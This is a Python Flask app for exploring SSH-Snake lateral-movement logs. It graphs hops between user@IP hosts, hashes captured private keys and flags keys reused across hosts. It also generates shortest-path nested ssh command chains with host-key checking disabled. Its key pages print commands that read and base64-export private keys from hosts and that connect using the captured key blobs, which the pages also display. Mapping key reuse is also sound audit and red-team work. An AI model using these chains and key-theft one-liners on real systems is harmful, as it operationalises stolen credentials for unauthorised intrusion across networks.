#!/usr/bin/env python3
import re
import argparse
import base64
import hashlib
import heapq
from pathlib import Path
from collections import defaultdict, Counter

from flask import Flask, request, render_template_string


# ---------- Regex definitions ----------

# user@IPv4, e.g. root@10.147.46.194
USER_HOST_RE = re.compile(r'([a-zA-Z0-9_]+@(?:\d{1,3}\.){3}\d{1,3})')

# "Discovered usable private key in [/path]" (case/whitespace tolerant)
DISCOVERED_KEY_RE = re.compile(
    r'Discovered\s+(?:usable\s+)?private key in\s+\[(.*?)\]',
    re.IGNORECASE,
)

# "EXTERNAL_MSG: KEY[/path]: <base64>"
KEY_MSG_RE = re.compile(
    r'EXTERNAL_MSG:\s*KEY\[(.*?)\]:',
    re.IGNORECASE,
)

# Key used on an edge: "[!/path/to/key]"
KEY_ON_EDGE_RE = re.compile(r'\[!(/[^]]+)\]')


# ---------- Helper functions ----------

def extract_user_host(s: str):
    """Return the first user@ip in the string, or None."""
    m = USER_HOST_RE.search(s)
    return m.group(1) if m else None


def extract_last_user_host(s: str):
    """
    Return the last user@ip in the string, or None.

    This is important for lines like:
      root@A->user@B->user@C: EXTERNAL_MSG ...

    where the key event pertains to the final host (user@C).
    """
    matches = USER_HOST_RE.findall(s)
    return matches[-1] if matches else None


def compute_key_hash_from_blob(blob: str):
    """
    Compute a stable hash for a key blob (base64 or raw text).
    Returns "sha256:<hex>" or None if blob is empty.
    """
    blob = blob.strip()
    if not blob:
        return None
    try:
        key_bytes = base64.b64decode(blob)
    except Exception:
        # If decoding fails, hash the raw text; still stable.
        key_bytes = blob.encode()
    h = hashlib.sha256(key_bytes).hexdigest()
    return f"sha256:{h}"


# ---------- Log parser ----------

def parse_log(path: Path):
    """
    Parse the SSH-Snake style log.

    Returns:
        lateral_edges: set[(src_user_host, dst_user_host)]
        key_events:    list[(host, key_path, relation, key_hash|None)]
                       relation in {"discovered", "used"}
                       key_hash is "sha256:..." or None
        edge_key_usage: list[(src, dst, key_path|None, key_hash|None)]
                        key_hash is "sha256:..." or None
        base64_by_hash: dict[hash_id -> original base64 blob]
    """
    lateral_edges = set()
    key_events = []
    edge_key_usage = []

    # Temporary mapping for (host, path) -> key_hash discovered from EXTERNAL_MSG
    hash_by_host_path = {}
    # Mapping from sha256 hash -> original base64 blob captured in EXTERNAL_MSG
    base64_by_hash = {}

    with path.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.rstrip("\n")

            # Strip "[timestamp]..." prefix
            try:
                _, content = line.split("]", 1)
            except ValueError:
                content = line
            content = content.strip()

            # 1) Lateral movement edges and key usage on edges
            if "->" in content:
                segments = content.split("->")

                for i in range(len(segments) - 1):
                    seg_src = segments[i]
                    seg_dst = segments[i + 1]

                    src = extract_user_host(seg_src)
                    dst = extract_user_host(seg_dst)
                    if not (src and dst):
                        continue

                    lateral_edges.add((src, dst))

                    m_edge_key = KEY_ON_EDGE_RE.search(seg_src)
                    if m_edge_key:
                        key_path = m_edge_key.group(1)
                        key_hash = hash_by_host_path.get((src, key_path))
                        edge_key_usage.append((src, dst, key_path, key_hash))
                    else:
                        edge_key_usage.append((src, dst, None, None))

            # 2) Discovered key on host (no blob here)
            m_disc = DISCOVERED_KEY_RE.search(content)
            if m_disc:
                key_path = m_disc.group(1)
                # Host is the last user@ip before the colon
                account_part = content.split(":", 1)[0]
                user_host = extract_last_user_host(account_part)
                if user_host:
                    key_hash = hash_by_host_path.get((user_host, key_path))
                    key_events.append((user_host, key_path, "discovered", key_hash))

            # 3) EXTERNAL_MSG KEY[...] events with base64 blob
            m_key = KEY_MSG_RE.search(content)
            if m_key:
                key_path = m_key.group(1)
                account_part = content.split(":", 1)[0]
                user_host = extract_last_user_host(account_part)
                if user_host:
                    # Extract blob after "KEY[...]:"
                    idx = content.find("KEY[")
                    blob = ""
                    if idx != -1:
                        after = content[idx:]  # "KEY[/path]: <base64...>"
                        parts = after.split("]:", 1)
                        if len(parts) == 2:
                            blob = parts[1].strip()

                    key_hash = compute_key_hash_from_blob(blob) if blob else None
                    if key_hash:
                        hash_by_host_path[(user_host, key_path)] = key_hash
                        # Store original base64 for this content hash (first seen)
                        base64_by_hash.setdefault(key_hash, blob)
                    key_events.append((user_host, key_path, "used", key_hash))

    # Second pass: fill hashes for earlier discovered events and edges
    new_key_events = []
    for host, path, relation, key_hash in key_events:
        if path is not None and key_hash is None:
            h2 = hash_by_host_path.get((host, path))
            if h2 is not None:
                key_hash = h2
        new_key_events.append((host, path, relation, key_hash))
    key_events = new_key_events

    new_edge_usage = []
    for src, dst, path, key_hash in edge_key_usage:
        if path is not None and key_hash is None:
            h2 = hash_by_host_path.get((src, path))
            if h2 is not None:
                key_hash = h2
        new_edge_usage.append((src, dst, path, key_hash))
    edge_key_usage = new_edge_usage

    return lateral_edges, key_events, edge_key_usage, base64_by_hash


# ---------- Shortest-path graph (SSH-Snake style) ----------

class Graph:
    def __init__(self):
        self.graph = {}

    def add_edge(self, start, end):
        if start not in self.graph:
            self.graph[start] = []
        self.graph[start].append(end)

    def dijkstra(self, start, end):
        heap = [(0, start, [])]
        visited = set()
        while heap:
            (cost, node, path) = heapq.heappop(heap)
            if node not in visited:
                visited.add(node)
                path = path + [node]
                if node == end:
                    return path
                for neighbor in self.graph.get(node, []):
                    if neighbor not in visited:
                        heapq.heappush(heap, (cost + 1, neighbor, path))
        return None


def build_lookup_table(input_lines, ignore_dest_user=False):
    """
    Build a lookup table from SSH-Snake output lines, similar to
    tools/shortest-path-create-chain.py.
    """
    lookup_table = {}

    for line in input_lines:
        line = line.strip()
        # Strip optional timestamp at start
        line = re.sub(r"^\[?\d+\]?\s*", "", line)
        prev_dest_host = None

        # Skip lines that are not pure chain lines
        if ": " in line or "]->" not in line or not line[-1].isdigit():
            continue

        pattern = re.compile(
            r"(\w+)@(\d+\.\d+\.\d+\.\d+)(\[[^\]]+\])->(?=(\w+)@(\d+\.\d+\.\d+\.\d+))"
        )
        matches = re.finditer(pattern, line)

        for match in matches:
            user, host, path, dest_user, dest_host = match.groups()

            # Handle local 127.0.0.1 references
            if host in ("(127.0.0.1)", "127.0.0.1"):
                if prev_dest_host is not None:
                    host = prev_dest_host

            if dest_host in ("(127.0.0.1)", "127.0.0.1"):
                dest_host = host

            prev_dest_host = dest_host
            if ignore_dest_user:
                target_range = (host, dest_host)
            else:
                target_range = (f"{user}@{host}", f"{dest_user}@{dest_host}")

            if target_range in lookup_table:
                continue

            entry = [user, host, path, dest_user, dest_host]
            lookup_table[target_range] = entry

    return lookup_table


def build_cmd(lookup_table, sequence):
    """
    Build a nested ssh command from a node sequence, mirroring
    SSH-Snake's shortest-path-create-chain.py behavior.
    """
    result_str = ""

    for i in range(len(sequence) - 1):
        target_range = (sequence[i], sequence[i + 1])
        if target_range in lookup_table:
            user, host, path, dest_user, dest_host = lookup_table[target_range]
            # Extract key path from [!path]
            inner = path.split("[", 1)[1].split("]", 1)[0]
            if not inner:
                continue
            if inner[0] == "!":
                result_str += "sudo "
                inner = inner[1:]
            result_str += (
                "ssh -t -oIdentitiesOnly=yes "
                "-oServerAliveInterval=300 -oTCPKeepAlive=no "
                "-oConnectTimeout=5 -oStrictHostKeyChecking=no "
                "-oGlobalKnownHostsFile=/dev/null "
                "-oUserKnownHostsFile=/dev/null "
                "-oBatchMode=yes "
                f"-i \"{inner}\" {dest_user}@{dest_host} '"
            )
        else:
            print(f"Could not find {target_range[0]}->{target_range[1]}")
            return None

    # Close nested quotes
    for _ in range(len(sequence) - 3):
        result_str += "'"

    result_str = result_str.rstrip("->")
    return result_str


# ---------- Global state ----------

app = Flask(__name__)

LATERAL_EDGES = set()
KEY_EVENTS = []
EDGE_KEY_USAGE = []

ALL_NODES = set()
OUT_EDGES = {}
IN_EDGES = {}

# host -> key_path -> {"relations": set(...), "hash": hash_id}
# hash_id is either:
#   - "sha256:..." for keys with known content
#   - "nohash:<host>:<path>" for keys with unknown content
KEYS_BY_HOST = {}

# (host, key_path) -> hash_id
HASH_BY_HOST_AND_PATH = {}

# hash_id -> set(hosts)  (includes both sha256: and nohash: ids)
HOSTS_BY_HASH = {}
# hash_id -> set(paths)
PATHS_BY_HASH = {}
# hash_id -> set[(host, path)]
HOSTPATHS_BY_HASH = {}

# hashes that represent real content (sha256:...) and appear on >1 host
DUPLICATE_KEY_HASHES = set()

# dst_host -> list[(src_host, key_path|None, key_hash|None)]
# key_hash here is "sha256:..." or None (content-level only, no "nohash:" here)
KEYS_USED_TO_NODE = {}

OUT_DEGREE = {}
IN_DEGREE = {}

# Shortest-path structures (SSH-Snake style)
LOOKUP_TABLE = {}
SHORTEST_GRAPH = None

# hash_id ("sha256:...") -> original base64 blob captured in EXTERNAL_MSG
BASE64_BY_HASH = {}


# ---------- HTML Templates ----------

INDEX_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>SSH Lateral Movement Explorer</title>
    <style>
      body { font-family: sans-serif; margin: 20px; }
      h1, h2, h3 { font-weight: 600; }
      table { border-collapse: collapse; margin-top: 10px; }
      th, td { padding: 4px 8px; border: 1px solid #ccc; }
      a { text-decoration: none; color: #0645ad; }
      a:hover { text-decoration: underline; }
      .muted { color: #666; font-size: 0.9em; }
    </style>
  </head>
  <body>
    <h1>SSH Lateral Movement Explorer</h1>
    <p class="muted">
      Parsed {{ num_edges }} lateral edges, {{ num_nodes }} nodes, {{ num_keys }} key events
      from <code>{{ logfile }}</code>.
    </p>

    <h2>Navigation</h2>
    <ul>
      <li><a href="{{ url_for('list_nodes') }}">All nodes (user@ip)</a></li>
      <li><a href="{{ url_for('list_keys') }}">All keys (by hash)</a></li>
    </ul>

    <h2>Top talkers (outbound edges)</h2>
    <table>
      <tr><th>Node</th><th>Outbound unique destinations</th></tr>
      {% for node, count in top_out %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ node }}">{{ node }}</a></td>
        <td>{{ count }}</td>
      </tr>
      {% endfor %}
    </table>

    <h2>Top targets (inbound edges)</h2>
    <table>
      <tr><th>Node</th><th>Inbound unique sources</th></tr>
      {% for node, count in top_in %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ node }}">{{ node }}</a></td>
        <td>{{ count }}</td>
      </tr>
      {% endfor %}
    </table>
  </body>
</html>
"""


NODES_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Nodes - SSH Explorer</title>
    <style>
      body { font-family: sans-serif; margin: 20px; }
      table { border-collapse: collapse; margin-top: 10px; }
      th, td { padding: 4px 8px; border: 1px solid #ccc; }
      a { text-decoration: none; color: #0645ad; }
      a:hover { text-decoration: underline; }
    </style>
  </head>
  <body>
    <h1>All nodes (user@ip)</h1>
    <p>Total nodes: {{ num_nodes }}</p>
    <p><a href="{{ url_for('index') }}">Back to summary</a></p>
    <table>
      <tr><th>Node</th><th>Outbound</th><th>Inbound</th></tr>
      {% for node in nodes %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ node }}">{{ node }}</a></td>
        <td>{{ out_degree.get(node, 0) }}</td>
        <td>{{ in_degree.get(node, 0) }}</td>
      </tr>
      {% endfor %}
    </table>
  </body>
</html>
"""


NODE_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Node {{ node }} - SSH Explorer</title>
    <style>
      body { font-family: sans-serif; margin: 20px; }
      table { border-collapse: collapse; margin-top: 10px; }
      th, td { padding: 4px 8px; border: 1px solid #ccc; }
      a { text-decoration: none; color: #0645ad; }
      a:hover { text-decoration: underline; }
      h2 { margin-top: 24px; }
      .dup-tag { color: #b00; font-weight: bold; margin-left: 6px; }
      code { font-size: 0.9em; }
      .muted { color: #666; font-size: 0.9em; }
    </style>
  </head>
  <body>
    <h1>Node: {{ node }}</h1>
    <p>
      Outbound unique destinations: {{ out_total }} |
      Inbound unique sources: {{ in_total }}
    </p>
    <p><a href="{{ url_for('index') }}">Back to summary</a></p>

    <h2>Outbound connections</h2>
    {% if outgoing %}
    <table>
      <tr><th>Destination</th><th>Edge count</th></tr>
      {% for dst, count in outgoing %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ dst }}">{{ dst }}</a></td>
        <td>{{ count }}</td>
      </tr>
      {% endfor %}
    </table>
    {% else %}
    <p>No outbound edges.</p>
    {% endif %}

    <h2>Inbound connections</h2>
    {% if incoming %}
    <table>
      <tr><th>Source</th><th>Edge count</th></tr>
      {% for src, count in incoming %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ src }}">{{ src }}</a></td>
        <td>{{ count }}</td>
      </tr>
      {% endfor %}
    </table>
    {% else %}
    <p>No inbound edges.</p>
    {% endif %}

    <h2>Keys discovered/used on this host</h2>
    {% if keys_local %}
    <table>
      <tr><th>Key path</th><th>Hash</th><th>Relations</th></tr>
      {% for key_path, relations, hash_short, is_dup, host_count, hash_id in keys_local %}
      <tr>
        <td>{{ key_path }}</td>
        <td>
          {% if hash_short %}
            <a href="{{ url_for('key_view') }}?id={{ hash_id }}">
              <code>{{ hash_short }}</code>
            </a>
            {% if is_dup %}
              <span class="dup-tag">(DUPLICATE on {{ host_count }} hosts)</span>
            {% endif %}
          {% else %}
            <span class="muted">unknown (no content logged)</span>
          {% endif %}
        </td>
        <td>{{ ", ".join(relations) }}</td>
      </tr>
      {% endfor %}
    </table>
    {% else %}
    <p>No local key events recorded for this host.</p>
    {% endif %}

    <h2>Keys used to reach this host (on inbound edges)</h2>
    {% if keys_used_to_reach %}
    <table>
      <tr><th>Key path</th><th>Hash</th><th>Sources</th><th>Example SSH command (shortest path)</th></tr>
      {% for key_path, hash_short, is_dup, host_count, sources, example_cmd, hash_id in keys_used_to_reach %}
      <tr>
        <td>{{ key_path }}</td>
        <td>
          {% if hash_short %}
            <a href="{{ url_for('key_view') }}?id={{ hash_id }}">
              <code>{{ hash_short }}</code>
            </a>
            {% if is_dup %}
              <span class="dup-tag">(DUPLICATE on {{ host_count }} hosts)</span>
            {% endif %}
          {% else %}
            <span class="muted">unknown</span>
          {% endif %}
        </td>
        <td>
          {% for src in sources %}
            {{ src }}{% if not loop.last %}, {% endif %}
          {% endfor %}
        </td>
        <td>
          {% if example_cmd %}
            <code>{{ example_cmd }}</code>
          {% else %}
            <code>ssh -i {{ key_path }} {{ node }}</code>
          {% endif %}
        </td>
      </tr>
      {% endfor %}
    </table>
    {% else %}
    <p>No keys recorded on inbound edges to this host.</p>
    {% endif %}
  </body>
</html>
"""


KEYS_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Keys - SSH Explorer</title>
    <style>
      body { font-family: sans-serif; margin: 20px; }
      table { border-collapse: collapse; margin-top: 10px; }
      th, td { padding: 4px 8px; border: 1px solid #ccc; }
      a { text-decoration: none; color: #0645ad; }
      a:hover { text-decoration: underline; }
      tr.duplicate td { background-color: #ffe6e6; }
      .dup-tag { color: #b00; font-weight: bold; margin-left: 6px; }
      code { font-size: 0.9em; }
      .muted { color: #666; font-size: 0.9em; }
    </style>
  </head>
  <body>
    <h1>Keys (grouped by hash)</h1>
    <p>
      Total distinct hash IDs: {{ num_keys }}
      ({{ num_dups }} content hashes reused on &gt; 1 host)
    </p>
    <p><a href="{{ url_for('index') }}">Back to summary</a></p>
    <table>
      <tr>
        <th>Key hash ID</th>
        <th>Host count</th>
        <th>Hosts</th>
        <th>Paths</th>
        <th>Duplicate?</th>
      </tr>
      {% for key_hash, hosts, paths, is_real, is_dup in items %}
      <tr class="{% if is_dup %}duplicate{% endif %}">
        <td>
          {% if is_real %}
            <a href="{{ url_for('key_view') }}?id={{ key_hash }}">
              <code>{{ key_hash }}</code>
            </a>
          {% else %}
            <a href="{{ url_for('key_view') }}?id={{ key_hash }}">
              <span class="muted">{{ key_hash }}</span>
            </a>
          {% endif %}
        </td>
        <td>{{ hosts|length }}</td>
        <td>
          {% for host in hosts %}
            <a href="{{ url_for('node_view') }}?name={{ host }}">{{ host }}</a>{% if not loop.last %}, {% endif %}
          {% endfor %}
        </td>
        <td>
          {% for path in paths %}
            {{ path }}{% if not loop.last %}, {% endif %}
          {% endfor %}
        </td>
        <td>
          {% if is_dup %}
            <span class="dup-tag">YES ({{ hosts|length }} hosts)</span>
          {% elif is_real %}
            No
          {% else %}
            <span class="muted">N/A (no content)</span>
          {% endif %}
        </td>
      </tr>
      {% endfor %}
    </table>
  </body>
</html>
"""


KEY_DETAIL_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Key {{ hash_id }} - SSH Explorer</title>
    <style>
      body { font-family: sans-serif; margin: 20px; }
      table { border-collapse: collapse; margin-top: 10px; }
      th, td { padding: 4px 8px; border: 1px solid #ccc; vertical-align: top; }
      a { text-decoration: none; color: #0645ad; }
      a:hover { text-decoration: underline; }
      code { font-size: 0.9em; }
      textarea { width: 100%; font-family: monospace; font-size: 0.85em; }
      .muted { color: #666; font-size: 0.9em; }
      .dup-tag { color: #b00; font-weight: bold; margin-left: 6px; }
    </style>
  </head>
  <body>
    <h1>Key detail</h1>
    <p>
      Hash ID:
      {% if is_real %}
        <code>{{ hash_id }}</code>
      {% else %}
        <span class="muted">{{ hash_id }}</span>
      {% endif %}
      {% if is_dup %}
        <span class="dup-tag">(content reused on {{ host_count }} hosts)</span>
      {% endif %}
    </p>
    <p>
      Hosts using this key: {{ host_count }}<br>
      Distinct paths: {{ path_count }}
    </p>
    <p><a href="{{ url_for('list_keys') }}">Back to keys list</a></p>

    <h2>Hosts and paths</h2>
    <table>
      <tr>
        <th>Host (user@ip)</th>
        <th>Key path</th>
        <th>Retrieve key / connect examples</th>
      </tr>
      {% for host, path, short_hash in hostpaths %}
      <tr>
        <td><a href="{{ url_for('node_view') }}?name={{ host }}">{{ host }}</a></td>
        <td>{{ path }}</td>
        <td>
          <div class="muted">View key text on host:</div>
          <code>ssh {{ host }} 'sudo cat {{ path }}'</code>
          <br>
          <div class="muted">Export key as base64 to local file:</div>
          <code>ssh {{ host }} 'sudo base64 {{ path }}' &gt; {{ short_hash }}_{{ host|replace("@","_") }}.b64</code>
          {% if is_real and base64_blob %}
            <br><br>
            <div class="muted">Connect directly using captured base64 (process substitution):</div>
            <code>KEY_B64='{{ base64_blob }}'; ssh -i &lt;(printf '%s' "$KEY_B64" | base64 -d) {{ host }}</code>
            <br>
            <div class="muted">Load into ssh-agent and connect:</div>
            <code>KEY_B64='{{ base64_blob }}'; eval "$(ssh-agent -s)"; printf '%s' "$KEY_B64" | base64 -d | ssh-add -; ssh {{ host }}; ssh-agent -k</code>
          {% endif %}
        </td>
      </tr>
      {% endfor %}
    </table>

    <h2>Captured base64 content from EXTERNAL_MSG</h2>
    {% if is_real and base64_blob %}
      <p class="muted">
        This is the base64 blob as captured in <code>EXTERNAL_MSG: KEY[...]</code> for this hash.
        You can decode it locally with <code>base64 -d</code> or use the one-liners above.
      </p>
      <textarea rows="10" readonly>{{ base64_blob }}</textarea>
    {% elif is_real %}
      <p class="muted">No base64 capture stored for this hash (no EXTERNAL_MSG blob found in the log).</p>
    {% else %}
      <p class="muted">This key has no content hash (only "Discovered" events, no EXTERNAL_MSG blob).</p>
    {% endif %}
  </body>
</html>
"""


# ---------- Shortest-path helper ----------

def shortest_path_command_for_sources(sources, dest_node):
    """
    For a set of source nodes (user@ip) and a destination node, compute
    the shortest path (by hops) using the SSH-Snake-style graph and
    return the nested ssh command string.

    If no path is found for any source, return None.
    """
    global SHORTEST_GRAPH, LOOKUP_TABLE

    if SHORTEST_GRAPH is None or not LOOKUP_TABLE:
        return None

    best_cmd = None
    best_len = None

    for src in sources:
        path = SHORTEST_GRAPH.dijkstra(src, dest_node)
        if not path:
            continue
        path_len = len(path)
        if best_len is None or path_len < best_len:
            cmd = build_cmd(LOOKUP_TABLE, path)
            if not cmd:
                continue
            best_cmd = cmd
            best_len = path_len

    return best_cmd


# ---------- Routes ----------

@app.route("/")
def index():
    num_edges = len(LATERAL_EDGES)
    num_nodes = len(ALL_NODES)
    num_keys = len(KEY_EVENTS)

    top_out = sorted(OUT_DEGREE.items(), key=lambda x: x[1], reverse=True)[:10]
    top_in = sorted(IN_DEGREE.items(), key=lambda x: x[1], reverse=True)[:10]

    return render_template_string(
        INDEX_TEMPLATE,
        num_edges=num_edges,
        num_nodes=num_nodes,
        num_keys=num_keys,
        top_out=top_out,
        top_in=top_in,
        logfile=str(app.config.get("LOGFILE", "")),
    )


@app.route("/nodes")
def list_nodes():
    nodes_sorted = sorted(ALL_NODES)
    return render_template_string(
        NODES_TEMPLATE,
        nodes=nodes_sorted,
        num_nodes=len(nodes_sorted),
        out_degree=OUT_DEGREE,
        in_degree=IN_DEGREE,
    )


@app.route("/node")
def node_view():
    name = request.args.get("name")
    if not name or name not in ALL_NODES:
        return ("Unknown node", 404)

    outgoing_list = OUT_EDGES.get(name, [])
    incoming_list = IN_EDGES.get(name, [])

    outgoing_counts = Counter(outgoing_list)
    incoming_counts = Counter(incoming_list)

    outgoing = outgoing_counts.most_common()
    incoming = incoming_counts.most_common()

    out_total = len(set(outgoing_list))
    in_total = len(set(incoming_list))

    # --- Local key events on this host ---
    keys_local_raw = KEYS_BY_HOST.get(name, {})
    keys_local = []
    for key_path, info in keys_local_raw.items():
        relations = sorted(info["relations"])
        hash_id = info.get("hash")
        if hash_id and hash_id.startswith("sha256:"):
            host_count = len(HOSTS_BY_HASH.get(hash_id, set()))
            is_dup = hash_id in DUPLICATE_KEY_HASHES
            hash_short = hash_id.split(":", 1)[-1][:16]
        else:
            # "nohash:..." or None
            host_count = len(HOSTS_BY_HASH.get(hash_id, {name})) if hash_id else 1
            is_dup = False
            hash_short = None
        keys_local.append((key_path, relations, hash_short, is_dup, host_count, hash_id))
    keys_local.sort(key=lambda x: x[0])

    # --- Keys used to reach this node (from inbound edges) ---
    used_raw = KEYS_USED_TO_NODE.get(name, [])
    by_key = defaultdict(lambda: {"paths": set(), "sources": set(), "hash": None})
    for src, path, key_hash in used_raw:
        if path is None:
            continue
        d = by_key[(key_hash, path)]
        d["paths"].add(path)
        d["sources"].add(src)
        d["hash"] = key_hash

    keys_used_to_reach = []
    for (key_hash, key_path), d in by_key.items():
        sources = sorted(d["sources"])
        if key_hash and key_hash.startswith("sha256:"):
            host_count = len(HOSTS_BY_HASH.get(key_hash, set()))
            is_dup = key_hash in DUPLICATE_KEY_HASHES
            hash_short = key_hash.split(":", 1)[-1][:16]
        else:
            host_count = 1
            is_dup = False
            hash_short = None

        example_cmd = shortest_path_command_for_sources(sources, name)

        keys_used_to_reach.append(
            (key_path, hash_short, is_dup, host_count, sources, example_cmd, key_hash)
        )
    keys_used_to_reach.sort(key=lambda x: x[0])

    return render_template_string(
        NODE_TEMPLATE,
        node=name,
        outgoing=outgoing,
        incoming=incoming,
        out_total=out_total,
        in_total=in_total,
        keys_local=keys_local,
        keys_used_to_reach=keys_used_to_reach,
    )


@app.route("/keys")
def list_keys():
    items = []
    for key_hash, hosts in HOSTS_BY_HASH.items():
        paths = sorted(PATHS_BY_HASH.get(key_hash, set()))
        hosts_sorted = sorted(hosts)
        is_real = key_hash.startswith("sha256:")
        is_dup = key_hash in DUPLICATE_KEY_HASHES
        items.append((key_hash, hosts_sorted, paths, is_real, is_dup))
    items.sort(key=lambda x: x[0])

    return render_template_string(
        KEYS_TEMPLATE,
        items=items,
        num_keys=len(items),
        num_dups=len(DUPLICATE_KEY_HASHES),
    )


@app.route("/key")
def key_view():
    hash_id = request.args.get("id")
    if not hash_id or hash_id not in HOSTS_BY_HASH:
        return ("Unknown key hash", 404)

    hosts = HOSTS_BY_HASH.get(hash_id, set())
    paths = PATHS_BY_HASH.get(hash_id, set())
    hostpaths_pairs = HOSTPATHS_BY_HASH.get(hash_id, set())

    is_real = hash_id.startswith("sha256:")
    is_dup = hash_id in DUPLICATE_KEY_HASHES
    host_count = len(hosts)
    path_count = len(paths)
    short_base = hash_id.split(":", 1)[-1][:16] if is_real else "key"

    hostpaths = []
    for host, path in sorted(hostpaths_pairs):
        hostpaths.append((host, path, short_base))

    base64_blob = BASE64_BY_HASH.get(hash_id, "")

    return render_template_string(
        KEY_DETAIL_TEMPLATE,
        hash_id=hash_id,
        is_real=is_real,
        is_dup=is_dup,
        host_count=host_count,
        path_count=path_count,
        hostpaths=hostpaths,
        base64_blob=base64_blob,
    )


# ---------- Graph building / CLI ----------

def build_graph_structures(lateral_edges, key_events, edge_key_usage, base64_by_hash):
    global LATERAL_EDGES, KEY_EVENTS, EDGE_KEY_USAGE, ALL_NODES
    global OUT_EDGES, IN_EDGES, KEYS_BY_HOST, HASH_BY_HOST_AND_PATH
    global HOSTS_BY_HASH, PATHS_BY_HASH, HOSTPATHS_BY_HASH, DUPLICATE_KEY_HASHES
    global KEYS_USED_TO_NODE, OUT_DEGREE, IN_DEGREE, BASE64_BY_HASH

    LATERAL_EDGES = set(lateral_edges)
    KEY_EVENTS = list(key_events)
    EDGE_KEY_USAGE = list(edge_key_usage)
    BASE64_BY_HASH = dict(base64_by_hash)

    out_edges = defaultdict(list)
    in_edges = defaultdict(list)
    all_nodes = set()

    for src, dst in lateral_edges:
        out_edges[src].append(dst)
        in_edges[dst].append(src)
        all_nodes.add(src)
        all_nodes.add(dst)

    # host -> key_path -> {relations, hash_id}
    keys_by_host = defaultdict(
        lambda: defaultdict(lambda: {"relations": set(), "hash": None})
    )
    hash_by_host_and_path = {}

    # hash_id -> hosts / paths / (host, path)
    hosts_by_hash = defaultdict(set)
    paths_by_hash = defaultdict(set)
    hostpaths_by_hash = defaultdict(set)

    # 1) Local key events (discovered / used)
    for host, path, relation, key_hash in key_events:
        if not host or not path:
            continue

        if key_hash:
            hash_id = key_hash  # "sha256:..."
        else:
            hash_id = f"nohash:{host}:{path}"

        entry = keys_by_host[host][path]
        entry["relations"].add(relation)
        entry["hash"] = hash_id

        hash_by_host_and_path[(host, path)] = hash_id
        hosts_by_hash[hash_id].add(host)
        paths_by_hash[hash_id].add(path)
        hostpaths_by_hash[hash_id].add((host, path))
        all_nodes.add(host)

    # 2) Keys used on edges (for node-level "keys used to reach this host")
    keys_used_to_node = defaultdict(list)
    for src, dst, path, key_hash in edge_key_usage:
        keys_used_to_node[dst].append((src, path, key_hash))
        all_nodes.add(src)
        all_nodes.add(dst)

    # 3) Only treat real content hashes (sha256:...) as true duplicates
    duplicate_hashes = {
        h for h, hosts in hosts_by_hash.items()
        if h.startswith("sha256:") and len(hosts) > 1
    }

    OUT_EDGES = dict(out_edges)
    IN_EDGES = dict(in_edges)
    KEYS_BY_HOST = {h: dict(paths) for h, paths in keys_by_host.items()}
    HASH_BY_HOST_AND_PATH = hash_by_host_and_path
    HOSTS_BY_HASH = {h: set(hosts) for h, hosts in hosts_by_hash.items()}
    PATHS_BY_HASH = {h: set(paths) for h, paths in paths_by_hash.items()}
    HOSTPATHS_BY_HASH = {h: set(hp) for h, hp in hostpaths_by_hash.items()}
    DUPLICATE_KEY_HASHES = duplicate_hashes
    KEYS_USED_TO_NODE = {d: list(v) for d, v in keys_used_to_node.items()}
    ALL_NODES = all_nodes

    OUT_DEGREE = {n: len(set(dsts)) for n, dsts in out_edges.items()}
    IN_DEGREE = {n: len(set(srcs)) for n, srcs in in_edges.items()}


def build_arg_parser():
    p = argparse.ArgumentParser(
        description=(
            "Run a web UI to explore SSH lateral movement and key usage "
            "(with hash-based duplicate key detection, base64 capture, and shortest-path commands)."
        )
    )
    p.add_argument(
        "logfile",
        help="Path to the SSH-Snake style log file.",
    )
    p.add_argument(
        "--host",
        default="127.0.0.1",
        help="Host/IP to bind the web server to (default: 127.0.0.1).",
    )
    p.add_argument(
        "--port",
        type=int,
        default=5000,
        help="Port to bind the web server to (default: 5000).",
    )
    return p


def main():
    global LOOKUP_TABLE, SHORTEST_GRAPH

    parser = build_arg_parser()
    args = parser.parse_args()

    log_path = Path(args.logfile)
    if not log_path.is_file():
        raise SystemExit(f"Log file does not exist: {log_path}")

    # Parse log for lateral movement and keys
    lateral_edges, key_events, edge_key_usage, base64_by_hash = parse_log(log_path)
    build_graph_structures(lateral_edges, key_events, edge_key_usage, base64_by_hash)

    # Build SSH-Snake-style lookup table and shortest-path graph
    with log_path.open("r", encoding="utf-8", errors="ignore") as f:
        input_lines = f.readlines()

    ignore_dest_user = False
    LOOKUP_TABLE = build_lookup_table(input_lines, ignore_dest_user=ignore_dest_user)

    graph = Graph()
    for edge in LOOKUP_TABLE:
        graph.add_edge(edge[0], edge[1])
    SHORTEST_GRAPH = graph

    app.config["LOGFILE"] = log_path

    print(
        f"Loaded {len(LATERAL_EDGES)} lateral edges, "
        f"{len(ALL_NODES)} nodes, {len(KEY_EVENTS)} key events, "
        f"{len(EDGE_KEY_USAGE)} edge-key usages from {log_path}"
    )
    print(f"Shortest-path edges: {len(LOOKUP_TABLE)}")
    print(f"Serving on http://{args.host}:{args.port}/")

    app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
